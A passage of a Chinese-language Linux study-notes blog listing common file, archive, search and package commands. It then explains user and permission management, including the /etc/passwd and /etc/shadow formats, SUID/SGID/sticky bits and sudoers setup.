class="line"><span class="built_in">cat</span> -n filename  <span class="comment">#[带行号]查看文件内容</span></span><br><span class="line"><span class="built_in">cat</span> test.txt &gt;&gt; README  <span class="comment">#将test.txt的内容追加到README文件中</span></span><br><span class="line"><span class="built_in">cat</span>&gt;&gt;a&lt;&lt;<span class="string">EOF      #追加新内容</span></span><br><span class="line"><span class="string">&gt; hello</span></span><br><span class="line"><span class="string">&gt; EOF</span></span><br><span class="line"><span class="built_in">cat</span>&gt;a&lt;&lt;<span class="string">EOF     #覆盖原始内容</span></span><br><span class="line"><span class="string">&gt; world</span></span><br><span class="line"><span class="string">&gt; EOF</span></span><br><span class="line"><span class="built_in">head</span> [-n]      <span class="comment">#查看n行（默认10行）</span></span><br><span class="line"><span class="built_in">tail</span> [-n]      <span class="comment">#查看末尾n行（默认10行）</span></span><br><span class="line"><span class="built_in">tail</span> -f        <span class="comment">#动态查看文件，可用于追踪日志文件信息变化</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#9 重定向</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;123456&quot;</span>&gt;hxjl.txt   <span class="comment">#覆盖重定向</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;123456&quot;</span>&gt;&gt;hxjl.txt  <span class="comment">#追加重定向</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#10 echo</span></span><br><span class="line"><span class="built_in">echo</span> -e         <span class="comment">#激活转义字符</span></span><br><span class="line"><span class="built_in">echo</span> -E         <span class="comment">#不激活转义字符</span></span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$envname</span>   <span class="comment">#打印环境变量</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;this is test&quot;</span> &gt; test.txt <span class="comment">#写入文件</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#11 grep</span></span><br><span class="line">grep [-参数] string filename   <span class="comment">#文件中筛选字符串；</span></span><br><span class="line">-i             <span class="comment">#不区分大小写</span></span><br><span class="line">-n             <span class="comment">#显示行号</span></span><br><span class="line">-c             <span class="comment">#统计匹配的行数</span></span><br><span class="line">-v             <span class="comment">#排除指定信息</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#wc [选项] [文件...]</span></span><br><span class="line">-l	    <span class="comment">#只显示行数（lines）</span></span><br><span class="line">-w	    <span class="comment">#只显示单词数（words）</span></span><br><span class="line">-c	    <span class="comment">#只显示字节数（characters）</span></span><br><span class="line">-m	    <span class="comment">#只显示字符数（包括多字节字符，如中文）</span></span><br><span class="line">-L	    <span class="comment">#显示最长行的长度</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#12 tree 展示目录下的结构</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#13 lrzsz</span></span><br><span class="line">rz -y           <span class="comment">#从Windows上传文件到Linux</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#14 wget</span></span><br><span class="line">wget url        <span class="comment">#下载Web内容到本机</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#15 file </span></span><br><span class="line">file fileName   <span class="comment">#查看文件类型/属性</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#16 rpm RPM是Red Hat公司随Redhat Linux推出了一个软件包管理器，通过它能够更加轻松容易地实现软件的安装。</span></span><br><span class="line"><span class="comment">#常见用法：</span></span><br><span class="line">rpm -ivh &lt;rpm包名&gt;        <span class="comment">#安装软件</span></span><br><span class="line">rpm -e &lt;rpm包名&gt;          <span class="comment">#卸载安装</span></span><br><span class="line">rpm -Uvh &lt;rpm包名&gt;        <span class="comment">#升级一个rpm</span></span><br><span class="line">rpm -qi &lt;rpm包名&gt;         <span class="comment">#显示软件安装信息</span></span><br><span class="line">rpm -qa | grep xxx       <span class="comment">#查询软件是否安装（包括相关依赖）</span></span><br><span class="line">rpm -qc &lt;包名&gt;	        <span class="comment">#仅列出包的配置文件</span></span><br><span class="line">rpm -qd &lt;包名&gt;	        <span class="comment">#仅列出包的文档文件（手册、README等）</span></span><br><span class="line">rpm -qlp &lt;RPM文件路径&gt;	   <span class="comment">#查询未安装的RPM包内包含哪些文件</span></span><br><span class="line">rpm -q --scripts &lt;包名&gt;	<span class="comment">#查看包的安装/卸载脚本</span></span><br><span class="line">-i, --install	     <span class="comment">#安装软件包	rpm -ivh package.rpm</span></span><br><span class="line">-v	--verbose        <span class="comment">#列出更多详细信息，安装进度	rpm -v install package.rpm</span></span><br><span class="line">-h, --<span class="built_in">hash</span>           <span class="comment">#安装时列出hash标记 (与 -v连用)  rpm -ihv package.rpm</span></span><br><span class="line">-U, --update	     <span class="comment">#升级软件包	rpm -Uvh new-package.rpm</span></span><br><span class="line">-e, --erase	         <span class="comment">#卸载软件包	rpm -e package-name</span></span><br><span class="line">-V, --verify         <span class="comment">#校验软件包文件完整性	rpm -V httpd</span></span><br><span class="line">-l	                 <span class="comment">#列出文件 (list files)</span></span><br><span class="line">–<span class="built_in">test</span>                <span class="comment">#安装测试，并不实际安装</span></span><br><span class="line">-q, --query 	     <span class="comment">#查询软件包信息	rpm -q httpd</span></span><br><span class="line"> -a, --all           <span class="comment">#查询/校验所有的安装包</span></span><br><span class="line"> -p, --package       <span class="comment">#查询/校验一个安装文件</span></span><br><span class="line"> -l, --list          <span class="comment">#列出安装文件</span></span><br><span class="line"> -d, --docfiles      <span class="comment">#列出所有文档文件</span></span><br><span class="line"> -f, --file          <span class="comment"># 查询/校验安装包中所包含的文件</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#17 stat</span></span><br><span class="line"><span class="built_in">stat</span> filename    <span class="comment">#查看文件属性（Size、Blocks、Inode、Atime、Mtime、Ctime等）</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#18 cut</span></span><br><span class="line">-c n1-n2         <span class="comment">#截取n1到n2的字符</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#19 find </span></span><br><span class="line">find  查找路径 选项参数(查找数据条件)  操作语句</span><br><span class="line">-mtime +10  <span class="comment">#10天前</span></span><br><span class="line">-mtime -10   <span class="comment">#10天内</span></span><br><span class="line">-name <span class="string">&quot;c.sh&quot;</span>#文件名</span><br><span class="line">-name <span class="string">&quot;hxjl*.txt&quot;</span>#支持正则</span><br><span class="line">-<span class="built_in">type</span> d     <span class="comment">#文件类型</span></span><br><span class="line">! -<span class="built_in">type</span> d   <span class="comment">#取反</span></span><br><span class="line">-size ±1M <span class="comment">#文件大小</span></span><br><span class="line">-perm 644 <span class="comment">#文件权限</span></span><br><span class="line">-<span class="built_in">exec</span>  <span class="built_in">ls</span>  -l  &#123;&#125;  \;  <span class="comment">#执行命令</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#locate 基于数据库快速查找文件，比 find 更高效</span></span><br><span class="line">-i	     <span class="comment">#忽略大小写（如 locate -i readme 匹配 README 和 readme）。</span></span><br><span class="line">-w	     <span class="comment">#按整词匹配（如 locate -w /etc 仅匹配 /etc 目录而非 /etc/passwd）。</span></span><br><span class="line">-c	     <span class="comment">#只返回匹配的文件数量，不显示文件名（如 locate -c bashrc）。</span></span><br><span class="line">-e	     <span class="comment">#只显示存在的文件（过滤已删除但仍在数据库中的记录）。</span></span><br><span class="line">--regex	 <span class="comment">#使用正则表达式匹配（如 locate --regex &#x27;.*\.(jpg|png)&#x27;）。</span></span><br><span class="line">locate *.pdf  <span class="comment"># 匹配所有 PDF 文件</span></span><br><span class="line">locate -i -e <span class="string">&#x27;apache2&#x27;</span>  <span class="comment"># 忽略大小写且只显示存在的文件</span></span><br><span class="line">locate /data/ | grep <span class="string">&#x27;/data/[^/]*\.log$&#x27;</span> <span class="comment"># 查找 /data 目录下一级子目录中的 log 文件</span></span><br><span class="line">locate <span class="string">&quot;<span class="subst">$(pwd)</span>/*.txt&quot;</span> <span class="comment">#查找当前文件夹下所有txt文件</span></span><br><span class="line"><span class="comment">#locate的速度比find快，它并不是真的查找，而是查数据库，一般文件数据库在/var/lib/mlocate/mlocate.db中，所以locate的查找并不是实时的，而是以数据库的更新为准，一般是系统自己维护，也可以手工升级数据库 ，命令为：updatedb</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#20 tar</span></span><br><span class="line">-z       <span class="comment">#表示打包的同时使用gzip的方式压缩</span></span><br><span class="line">-j       <span class="comment">#以 bzip2 方式压缩打包</span></span><br><span class="line">-c       <span class="comment">#表示创建一个压缩包文件</span></span><br><span class="line">-v       <span class="comment">#表示 显示操作过程</span></span><br><span class="line">-f       <span class="comment">#识别压缩路径信息</span></span><br><span class="line">-t       <span class="comment">#查看压缩包内文件     tf</span></span><br><span class="line">-x       <span class="comment">#解压               zxvf</span></span><br><span class="line">-tf      <span class="comment">#不解压的方式查看压缩的内容</span></span><br><span class="line">-zxvf    <span class="comment">#解压压缩包</span></span><br><span class="line">-cvf     <span class="comment">#打包</span></span><br><span class="line">-rvf     <span class="comment">#追加到已存在包</span></span><br><span class="line">-xvf     <span class="comment">#解压包</span></span><br><span class="line">tar -zcvf name.tar.gz file1 ... filen <span class="comment">#打包再压缩成gzip</span></span><br><span class="line">tar -zxvf name.tar.gz file1 ... filen <span class="comment">#解压缩在取消打包</span></span><br><span class="line">tar -jcvf name.tar.gz file1 ... filen <span class="comment">#打包再压缩成bzip2</span></span><br><span class="line">tar -jxvf name.tar.bz2 -C /path/      <span class="comment">#解压到指定目录</span></span><br><span class="line"><span class="comment">#不可以用find 作批量压缩命令</span></span><br><span class="line"><span class="comment">#find 路径... -exec  tar &#123;&#125; \; ×</span></span><br><span class="line"><span class="comment">#会造成压缩数据信息的覆盖！</span></span><br><span class="line"><span class="comment">#压缩数据时,如果使用绝对路径压缩数据，要把&quot;/&quot;移除.如果有&quot;/&quot;只能压缩到根目录下,没有&quot;/&quot;可以将文件压缩到指定目录(不懂)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#21 zip</span></span><br><span class="line">-r	     <span class="comment">#递归地将一个目录及其所有子目录和文件压缩到ZIP文件中</span></span><br><span class="line">-q	     <span class="comment">#在压缩文件时启用静默模式，即不显示压缩过程的详细信息</span></span><br><span class="line">-d	     <span class="comment">#从现有的ZIP文件中删除指定的文件或目录</span></span><br><span class="line">-u	     <span class="comment">#用于更新现有的ZIP文件，将新的文件或修改后的文件添加到ZIP存档中</span></span><br><span class="line">-f	     <span class="comment">#用于刷新（更新）现有ZIP文件中的指定文件。</span></span><br><span class="line">-m	     <span class="comment">#用于移动（归档）文件到一个ZIP压缩文件中，并在移动后将源文件删除。</span></span><br><span class="line">-e	     <span class="comment">#用于对ZIP压缩文件进行加密。</span></span><br><span class="line">-z	     <span class="comment">#为压缩文件添加注释</span></span><br><span class="line">zip -r 压缩包名.zip 文件1 文件2 文件n</span><br><span class="line">zip -r test.zip /home/test -x <span class="string">&quot;/home/test/test01/*&quot;</span> <span class="comment">#排除test01目录 -x 指定排除目录，注意没有双引号将不起作用。</span></span><br><span class="line"> zip -r test.zip <span class="built_in">test</span>/ -z <span class="comment">#添加注释信息。添加完成后输入回车后输入 . 之后再输入回车来结束</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># gzip 和 bzip2</span></span><br><span class="line">gunzip a.txt.gz</span><br><span class="line">gzip -d a.txt.gz</span><br><span class="line">bunzip2 a.bz2</span><br><span class="line">bzip2 -d a.bz2</span><br><span class="line"></span><br><span class="line"><span class="comment">#ln</span></span><br><span class="line"><span class="built_in">ln</span> /etc/services /data/link_hard  <span class="comment">#创建硬链接</span></span><br><span class="line"><span class="built_in">ln</span> -s /etc/services /data/link_soft  <span class="comment">#创建软链接</span></span><br></pre></td></tr></table></figure>
<h2 id="用户及权限管理">用户及权限管理</h2>
<h3 id="用户介绍">用户介绍</h3>
<p>用户信息: 可以作为系统数据或者程序进程操作管理者</p>
<p>用户组信息:可以将多个系统用户进行整合,方便统一对多个用户的权限进行管理</p>
<p><strong>用户</strong></p>
<table>
<thead>
<tr>
<th>字符</th>
<th>含义</th>
</tr>
</thead>
<tbody>
<tr>
<td>u</td>
<td>所属主   uid</td>
</tr>
<tr>
<td>g</td>
<td>所属组   gid</td>
</tr>
<tr>
<td>o</td>
<td>其他人   others</td>
</tr>
<tr>
<td>a</td>
<td>所有人   all</td>
</tr>
</tbody>
</table>
<p><strong>用户相关文件信息配置文件</strong>：/etc/passwd</p>
<p><img src="/posts/2c8b313c//image-20250719223400503.png" alt="image-20250719223400503"></p>
<p>以：为分隔符 分为若干部分</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">用户名:密码占位符:用户ID(UID):组ID(GID):用户描述:家目录:登录Shell</span><br></pre></td></tr></table></figure>
<ul class="lvl-0">
<li class="lvl-2">
<p>用户名：字符串（如root），用于用户登录，长度限制为 32 字符。</p>
</li>
<li class="lvl-2">
<p>密码占位符：通常为x，表示密码已加密存储在/etc/shadow中。若为空则表示无需密码登录（危险）。</p>
</li>
<li class="lvl-2">
<p>UID：整数，0 为 root 用户，1-999 为系统用户，1000 + 为普通用户。</p>
</li>
<li class="lvl-2">
<p>GID：对应/etc/group中的主组 ID。</p>
</li>
<li class="lvl-2">
<p>用户描述：可选信息（如John Doe），通常用于注释。</p>
</li>
<li class="lvl-2">
<p>家目录：用户登录后的默认目录（如/home/user），root 用户为/root。</p>
</li>
<li class="lvl-2">
<p>登录 Shell：用户登录后使用的 Shell 程序（如/bin/bash），/sbin/nologin表示禁止登录。</p>
</li>
</ul>
<p><strong>用户加密密码和密码策略</strong>：/etc/shadow</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">用户名:加密密码:最后修改日期:最小修改间隔:最大修改间隔:警告期:非活跃期:过期日期:保留字段</span><br></pre></td></tr></table></figure>
<p>加密密码使用<code> $id$salt$hash</code> 格式存储（如 <code>$6$...</code> 表示 SHA-512），<code>!</code> 或 <code>*</code> 表示账户锁定。</p>
<p><strong>用户组信息:</strong>/etc/group</p>
<h3 id="权限介绍"><strong>权限介绍</strong></h3>
<table>
<thead>
<tr>
<th style="text-align:center">字符</th>
<th>权限</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">w—4</td>
<td>写权限</td>
</tr>
<tr>
<td style="text-align:center">r----2</td>
<td>读权限</td>
</tr>
<tr>
<td style="text-align:center">x----1</td>
<td>执行权限（脚本文件先赋权才能再执行）</td>
</tr>
</tbody>
</table>
<p><img src="/posts/2c8b313c//image-20250719211822282.png" alt="image-20250719211822282"></p>
<p><strong>r 读权限 4</strong></p>
<ul class="lvl-0">
<li class="lvl-2">
<p>针对文件：利用此权限可以看到文件中的内容 cat</p>
</li>
<li class="lvl-2">
<p>针对目录：可以看到目录下有什么数据 ls/目录</p>
</li>
</ul>
<p><strong>w 写权限 2</strong></p>
<ul class="lvl-0">
<li class="lvl-2">
<p>针对文件：利用此权限可以编辑文件中的内容 vim echo&gt; &gt;&gt;</p>
</li>
<li class="lvl-2">
<p>针对目录: 利用此权限可以在目录中创建 删除文件信息 修改文件名称信息</p>
</li>
</ul>
<p><strong>x 执行权限 1</strong></p>
<ul class="lvl-0">
<li class="lvl-2">
<p>针对文件:利用此权限 执行脚本信息</p>
</li>
<li class="lvl-2">
<p>针对目录:利用此权限可以切换到目录中</p>
</li>
</ul>
<p>另 X：针对目录加执行权限，文件不加执行权限（因文件具备执行权限有安全隐患）</p>
<p><strong>企业真实场景权限配置:</strong></p>
<p>默认配置:</p>
<p>文件权限: 644 属主拥有读和写写权限 属组和其他用户只有读权限</p>
<p>目录权限: 755 属主拥有查看编辑进入权限 属组和其他用户只有查看进入权限</p>
<p>严格权限:</p>
<p>文件权限: 600 只有属主有读和写权限</p>
<p>目录权限: 700 只有属主有读写和进入权限</p>
<h3 id="特殊权限">特殊权限</h3>
<p>Linux 中的文件权限除了常见的读（<code>r</code>）、写（<code>w</code>）、执行（<code>x</code>）权限外，还有三个<strong>特殊权限</strong>：<code>SetUID</code>（SUID）、<code>SetGID</code>（SGID）和<code>Sticky Bit</code>。它们用于解决一些特定的场景需求，通常设置于可执行文件或目录上，提供额外的权限控制功能。</p>
<hr>
<h4 id="SetUID（SUID）"><strong>SetUID（SUID）</strong></h4>
<ul class="lvl-0">
<li class="lvl-2">
<p><strong>符号表示：</strong> <code>s</code>（出现在文件所有者的<strong>执行权限</strong>位置）</p>
</li>
<li class="lvl-2">
<p><strong>八进制表示：</strong> <code>4</code>（如 <code>4755</code>）</p>
</li>
<li class="lvl-2">
<p><strong>作用：</strong></p>
<ul class="lvl-2">
<li class="lvl-4">当<strong>可执行文件</strong>设置了 SUID 权限时，<strong>任何用户在执行该文件期间</strong>，会临时获得该<strong>文件所有者</strong>的权限。</li>
<li class="lvl-4">核心目的：允许普通用户以文件所有者的身份执行特定任务（通常是需要特权才能完成的任务）。</li>
</ul>
</li>
<li class="lvl-2">
<p><strong>经典例子：</strong> <code>/usr/bin/passwd</code></p>
<ul class="lvl-2">
<li class="lvl-4">普通用户（如 <code>user1</code>）需要修改自己的密码，密码最终存储在 <code>/etc/shadow</code>（该文件只有 <code>root</code> 可读写）。</li>
<li class="lvl-4"><code>passwd</code> 命令被设置了 SUID 且所有者是 <code>root</code>（权限 <code>-rwsr-xr-x</code>）。</li>
<li class="lvl-4">当 <code>user1</code> 执行 <code>passwd</code> 时，进程临时获得 <code>root</code> 权限，从而能修改 <code>/etc/shadow</code>。</li>
</ul>
</li>
<li class="lvl-2">
<p><strong>设置与查看：</strong></p>
<ul class="lvl-2">
<li class="lvl-4">设置：<code>chmod u+s 文件名</code> 或 <code>chmod 4xxx 文件名</code> (e.g., <code>chmod 4755 myprogram</code>)</li>
<li class="lvl-4">查看：如果所有者原本有 <code>x</code> 权限，<code>ls -l</code> 中所有者执行位显示为 <code>s</code>，如果所有者原本<em>没有</em> <code>x</code> 权限，则执行位显示为 <code>S</code>。</li>
</ul>
</li>
<li class="lvl-2">
<p><strong>重要安全提示：</strong> SUID 权限非常强大且<strong>危险性很高</strong>。不当设置（尤其是对脚本或不可信程序）会带来严重安全漏洞。应仅授予绝对必要且经过严格审查的可执行文件。</p>
</li>
</ul>
<hr>
<h4 id="SetGID（SGID）"><strong>SetGID（SGID）</strong></h4>
<ul class="lvl-0">
<li class="lvl-2">
<p><strong>符号表示：</strong> <code>s</code>（出现在所属组的<strong>执行权限</strong>位置）</p>
</li>
<li class="lvl-2">
<p><strong>八进制表示：</strong> <code>2</code>（如 <code>2755</code>）</p>
</li>
<li class="lvl-2">
<p><strong>作用（取决于应用对象）：</strong></p>
<ul class="lvl-2">
<li class="lvl-4"><strong>应用于可执行文件：</strong>
<ul class="lvl-4">
<li class="lvl-6">与 SUID 类似，但作用于<strong>组</strong>。</li>
<li class="lvl-6">任何用户在执行设置了 SGID 的文件时，会临时获得该<strong>文件所属组</strong>的权限。</li>
<li class="lvl-6">目的：允许用户以文件所属组的身份执行任务（通常用于共享资源访问）。</li>
</ul>
</li>
<li class="lvl-4"><strong>应用于目录：</strong>
<ul class="lvl-4">
<li class="lvl-6">这是 SGID <strong>更常见且重要的用途</strong>。</li>
<li class="lvl-6">在设置了 SGID 的目录中，<strong>任何用户在此目录下创建的新文件或子目录</strong>，其所属组<strong>自动继承该目录的所属组</strong>，而不是用户自己的默认主组。</li>
<li class="lvl-6">核心目的：<strong>强制协作共享</strong>。确保在共享目录中创建的所有文件都属于同一个特定组，方便组成员共同管理，无需手动修改组权限。</li>
</ul>
</li>
</ul>
</li>
<li class="lvl-2">
<p><strong>经典例子（目录）：</strong> 项目共享目录 <code>/shared/projectX</code></p>
<ul class="lvl-2">
<li class="lvl-4">设置所属组为 <code>projectx-team</code>：<code>chgrp projectx-team /shared/projectX</code></li>
<li class="lvl-4">设置 SGID：<code>chmod g+s /shared/projectX</code> 或 <code>chmod 2775 /shared/projectX</code></li>
<li class="lvl-4">现在，无论 <code>userA</code>（主组 <code>groupA</code>）还是 <code>userB</code>（主组 <code>groupB</code>）在 <code>/shared/projectX</code> 下创建文件 <code>report.txt</code>，该文件的所属组都会是 <code>projectx-team</code>（而不是 <code>groupA</code> 或 <code>groupB</code>）。</li>
</ul>
</li>
<li class="lvl-2">
<p><strong>设置与查看：</strong></p>
<ul class="lvl-2">
<li class="lvl-4">设置：<code>chmod g+s 文件名/目录名</code> 或 <code>chmod 2xxx 文件名/目录名</code> (e.g., <code>chmod 2775 sharedir</code>)</li>
<li class="lvl-4">查看：如果组原本有 <code>x</code> 权限，<code>ls -l</code> 中组执行位显示为 <code>s</code>，如果组原本<em>没有</em> <code>x</code> 权限，则组执行位显示为<code>S</code>。</li>
</ul>
</li>
<li class="lvl-2">
<p><strong>安全提示：</strong> SGID 的风险通常低于 SUID，但仍需谨慎设置于可执行文件。在目录上的应用是安全且推荐的文件共享方式。</p>
</li>
</ul>
<hr>
<h4 id="Sticky-Bit"><strong>Sticky Bit</strong></h4>
<ul class="lvl-0">
<li class="lvl-2">
<p><strong>符号表示：</strong> <code>t</code>（出现在其他用户的<strong>执行权限</strong>位置）</p>
</li>
<li class="lvl-2">
<p><strong>八进制表示：</strong> <code>1</code>（如 <code>1777</code>）</p>
</li>
<li class="lvl-2">
<p><strong>作用：</strong></p>
<ul class="lvl-2">
<li class="lvl-4">仅对<strong>目录</strong>有意义。</li>
<li class="lvl-4">在设置了 Sticky Bit 的目录中，<strong>用户只能删除或重命名自己拥有的文件或目录</strong>，即使该目录的写权限 (<code>w</code>) 对其他用户开放（如 <code>rwxrwxrwt</code>）。</li>
<li class="lvl-4">核心目的：<strong>保护用户文件不被他人误删</strong>。在全局可写的目录中（如临时目录），防止用户随意删除他人的文件。</li>
</ul>
</li>
<li class="lvl-2">
<p><strong>经典例子：</strong> 系统临时目录 <code>/tmp</code></p>
<ul class="lvl-2">
<li class="lvl-4">权限通常是 <code>drwxrwxrwt</code>。</li>
<li class="lvl-4">所有用户都有读、写、执行权限。</li>
<li class="lvl-4">末尾的 <code>t</code> 表示 Sticky Bit 已设置。</li>
<li class="lvl-4">用户 <code>user1</code> 可以在 <code>/tmp</code> 创建文件 <code>/tmp/user1file</code>。</li>
<li class="lvl-4">用户 <code>user2</code> 虽然对整个 <code>/tmp</code> 有写权限，但<strong>不能删除或重命名</strong> <code>/tmp/user1file</code>（除非他是 <code>root</code> 或文件所有者 <code>user1</code>）。<code>user2</code> 可以创建自己的 <code>/tmp/user2file</code>。</li>
</ul>
</li>
<li class="lvl-2">
<p><strong>设置与查看：</strong></p>
<ul class="lvl-2">
<li class="lvl-4">设置：<code>chmod o+t 目录名</code> 或 <code>chmod 1xxx 目录名</code> (e.g., <code>chmod 1777 /public/tmp</code>)</li>
<li class="lvl-4">查看：如果其他用户原本有 <code>x</code> 权限，<code>ls -l</code> 中其他用户执行位显示为 <code>t</code>，如果其他用户原本<em>没有</em> <code>x</code> 权限，其他用户执行位显示为<code>T</code>。</li>
</ul>
</li>
<li class="lvl-2">
<p><strong>应用场景：</strong> 主要用于全局可写的共享临时目录（如 <code>/tmp</code>）。现代 Linux 中，对用户主目录 (<code>~</code>) 或普通共享目录（使用 SGID 管理组）通常不需要设置 Sticky Bit。</p>
</li>
</ul>
<hr>
<h4 id="总结"><strong>总结</strong></h4>
<table>
<thead>
<tr>
<th>权限名称</th>
<th>符号</th>
<th>八进制值</th>
<th>主要作用对象</th>
<th>核心功能</th>
</tr>
</thead>
<tbody>
<tr>
<td><strong>SUID</strong></td>
<td><code>s</code> (所有者x位)</td>
<td><code>4</code></td>
<td><strong>可执行文件</strong></td>
<td>执行时获得<strong>文件所有者</strong>权限</td>
</tr>
<tr>
<td><strong>SGID</strong></td>
<td><code>s</code> (组x位)</td>
<td><code>2</code></td>
<td><strong>可执行文件</strong></td>
<td>执行时获得<strong>文件所属组</strong>权限</td>
</tr>
<tr>
<td></td>
<td></td>
<td></td>
<td><strong>目录</strong></td>
<td>目录下<strong>新建文件继承目录的组</strong></td>
</tr>
<tr>
<td><strong>Sticky Bit</strong></td>
<td><code>t</code> (其他用户x位)</td>
<td><code>1</code></td>
<td><strong>目录</strong></td>
<td><strong>仅文件所有者可删除</strong>目录下的文件</td>
</tr>
</tbody>
</table>
<hr>
<p><strong>查看系统中的特殊权限实例</strong></p>
<ul class="lvl-0">
<li class="lvl-2">
<p><strong>SUID:</strong> <code>ls -l /usr/bin/passwd</code> (应看到 <code>-rwsr-xr-x</code>)</p>
</li>
<li class="lvl-2">
<p><strong>SGID (目录):</strong> <code>ls -ld /var/mail</code> (很多系统设置为 <code>drwxrwsr-x</code>)</p>
</li>
<li class="lvl-2">
<p><strong>Sticky Bit:</strong> <code>ls -ld /tmp</code> (应看到 <code>drwxrwxrwt</code>)</p>
</li>
</ul>
<p>理解并正确使用这三个特殊权限对于 Linux 系统管理、权限规划和系统安全至关重要。务必谨慎设置 SUID，善用 SGID 管理共享目录，并在需要全局可写临时目录时使用 Sticky Bit。</p>
<h3 id="sudoers权限分配">sudoers权限分配</h3>
<p><strong><code>sudoers</code>文件编辑与定位</strong></p>
<p>执行<code>visudo</code>命令进入编辑界面后，可通过<code>100gg</code>快捷键快速定位至文件第 100 行附近（具体行数需根据系统版本及配置历史调整，通常用于找到预设的用户权限配置段），在此处可添加或修改用户的<code>sudo</code>权限规则。</p>
<p><strong>验证<code>sudoers</code>配置正确性</strong></p>
<p>配置完成后，需通过<code>visudo -c</code>命令验证<code>/etc/sudoers</code>文件的语法合法性，确保无格式错误：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[01:18:44 root@centon7 tmp]# visudo -c</span><br><span class="line">/etc/sudoers：解析正确</span><br></pre></td></tr></table></figure>
<p>若输出 “解析正确”，则说明配置文件语法无误，可正常生效。</p>
<p><strong>查看系统用户与权限配置</strong></p>
<p>在<code>/etc/sudoers</code>中，用户权限规则的典型配置格式为：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">用户名  ALL=(ALL)  /sbin/useradd,/bin/cat</span><br></pre></td></tr></table></figure>
<p>其中：</p>
<ul class="lvl-0">
<li class="lvl-2">
<p><code>ALL=(ALL)</code>表示该用户可在所有主机上以所有用户身份执行命令；</p>
</li>
<li class="lvl-2">
<p>末尾的<code>/sbin/useradd,/bin/cat</code>为允许执行的具体命令列表（多命令用逗号分隔）。</p>
</li>
</ul>
<p><strong>查看用户<code>sudo</code>权限</strong></p>
<p>对于已配置<code>sudo</code>权限的用户，可通过<code>sudo -l</code>命令查看自身被授权的具体操作，便于验证权限分配是否符合预期：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sudo</span> -l</span><br></pre></td></tr></table></figure>
<p>该命令会列出当前用户可通过<code>sudo</code>执行的所有命令及相关限制。</p>
<h3 id="用户及权限管理命令">用户及权限管理命令</h3>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#1 chmod</span></span><br><span class="line"><span class="built_in">chmod</span> XXX filename   <span class="comment">#数字赋权</span></span><br><span class="line"><span class="built_in">chmod</span> +x filename    <span class="comment">#添加执行权</span></span><br><span class="line"><span class="built_in">chmod</span> u+x,g+x,o+x  filename   <span class="comment">#所有用户添加执行权==chmod +x filename==chmod a+x filename</span></span><br><span class="line"><span class="built_in">chmod</span> ug+w,o-w 1.txt 2.txt</span><br><span class="line"><span class="built_in">chmod</span> a=wx c.txt</span><br><span class="line"><span class="built_in">chmod</span> -R             <span class="comment"># 命令表示将某个目录下面所有的内容都增加相应权限</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#id</span></span><br><span class="line"><span class="built_in">id</span> user              <span class="comment">#查看用户的 UID、GID 以及所属的用户组列表</span></span><br><span class="line"><span class="built_in">id</span>                   <span class="comment">#查看自己的 UID、GID 以及所属的用户组列表</span></span><br><span class="line"><span class="comment">#whoami   可以查看当前系统操作者  即 登录的用户</span></span><br><span class="line"><span class="comment">#w        可以查看当前系统登录的用户信息   指的是 正在连接登录的用户信息</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#useradd  --添加用户信息</span></span><br><span class="line">-c   <span class="comment">#设置用户备注信息</span></span><br><span class="line">-u   <span class="comment">#设置指定用户所属主   uid</span></span><br><span class="line">-g   <span class="comment">#设置用户所属组信息   gid</span></span><br><span class="line">-G   <span class="comment">#设置用户所属的附加组   </span></span><br><span class="line">-M   <span class="comment">#设置用户不创建家目录（创建虚拟用户）</span></span><br><span class="line">-s   <span class="comment">#设置用户是否能登录（创建虚拟用户）</span></span><br><span class="line">useradd -g <span class="built_in">users</span> -c <span class="string">&quot;hr tom&quot;</span> tom</span><br><span class="line"></span><br><span class="line"><span class="comment">#su      切换用户：表示替换或转换用户身份 不完全切换</span></span><br><span class="line"><span class="comment">#su -    完全切换 用户相关环境变量信息会一并彻底切换</span></span><br><span class="line"><span class="comment">#sudo    提权，但需要先对特殊操作进行权限分配</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#passwd  设置/更改密码</span></span><br><span class="line"><span class="comment">#面交互方式创建用户并设置密码（可利用脚本创建用户）</span></span><br><span class="line">useradd xhy</span><br><span class="line"><span class="built_in">echo</span> 123456|passwd --stdin xhy</span><br><span class="line"></span><br><span class="line"><span class="comment">#userdel  </span></span><br><span class="line">userdel  用户名     <span class="comment">#保留用户家目录的数据</span></span><br><span class="line">userdel -r  用户名  <span class="comment">#彻底删除用户信息</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#usermod 参数 匹配信息 对象</span></span><br><span class="line">-c   <span class="comment">#修改用户备注信息</span></span><br><span class="line">-u   <span class="comment">#修改指定用户所属主   uid</span></span><br><span class="line">-g   <span class="comment">#修改用户所属组信息   gid</span></span><br><span class="line">-G   <span class="comment">#修改用户所属的附加组   </span></span><br><span class="line">-aG  <span class="comment">#添加用户到多个附加组</span></span><br><span class="line">-M   <span class="comment">#修改用户不创建家目录（创建虚拟用户）</span></span><br><span class="line">-s   <span 